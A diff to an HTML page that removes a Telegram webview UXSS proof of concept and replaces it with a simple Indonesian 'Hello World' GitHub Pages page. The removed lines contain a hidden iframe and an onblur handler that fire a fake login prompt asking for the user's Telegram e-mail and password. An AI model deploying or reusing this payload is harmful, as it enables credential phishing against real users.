@@ -1,28 +1,19 @@
-<html lang="en-US">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Telegram)</title>
-	
-	<style>
-		iframe {
-			visibility: hidden;
-		}
-	</style>
-   
-	<script>
-		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:prompt('In order to access telegram.com\\nyou must first login on your\\nTelegram Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
-		}
-	</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Web Saya</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+    </style>
 </head>
-
 <body>
-   <center>
-		<br>
-		<h1>Click Here</h1>
-	</center>
-   <iframe id="iframe"></iframe>
+    <h1>Halo Dunia!</h1>
+    <p>Ini adalah halaman web publik saya dari GitHub Pages.</p>
 </body>
-
 </html>
